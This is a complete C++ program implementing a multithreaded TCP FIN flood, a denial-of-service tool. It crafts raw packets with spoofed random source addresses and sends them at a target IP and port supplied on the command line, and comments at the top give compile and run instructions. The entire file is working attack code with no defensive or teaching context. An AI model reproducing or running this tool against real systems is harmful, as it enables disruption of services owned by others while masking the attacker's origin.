// Compile: g++ -o fin_flood fin_flood.cpp -lpthread
// Run: sudo ./fin_flood <target_ip> <target_port> <count> <threads>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>

class FINFlood {
private:
    std::string targetIP;
    int targetPort;
    std::atomic<int> counter{0};
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FINFlood(const std::string& ip, int port) : targetIP(ip), targetPort(port) {}
    
    void flood(int count) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) return;
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(targetPort);
        target.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        for (int i = 0; i < count; i++) {
            char packet[4096];
            struct iphdr* ip = (struct iphdr*)packet;
            struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
            
            memset(packet, 0, 4096);
            
            ip->ihl = 5;
            ip->version = 4;
            ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            ip->ttl = 64;
            ip->protocol = IPPROTO_TCP;
            ip->saddr = rand();
            ip->daddr = target.sin_addr.s_addr;
            ip->check = checksum(ip, sizeof(struct iphdr));
            
            tcp->source = htons(rand() % 65535);
            tcp->dest = target.sin_port;
            tcp->seq = rand();
            tcp->doff = 5;
            tcp->fin = 1;
            tcp->window = htons(0);
            
            sendto(sock, packet, ip->tot_len, 0, 
                   (struct sockaddr*)&target, sizeof(target));
            counter++;
        }
        
        close(sock);
    }
    
    void start(int count, int threads) {
        std::vector<std::thread> workers;
        int perThread = count / threads;
        
        for (int i = 0; i < threads; i++) {
            workers.emplace_back([this, perThread]() {
                flood(perThread);
            });
        }
        
        for (auto& t : workers) t.join();
        std::cout << "Sent " << counter << " FIN packets\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_port> <count> <threads>\n";
        return 1;
    }
    FINFlood flood(argv[1], atoi(argv[2]));
    flood.start(atoi(argv[3]), atoi(argv[4]));
    return 0;
}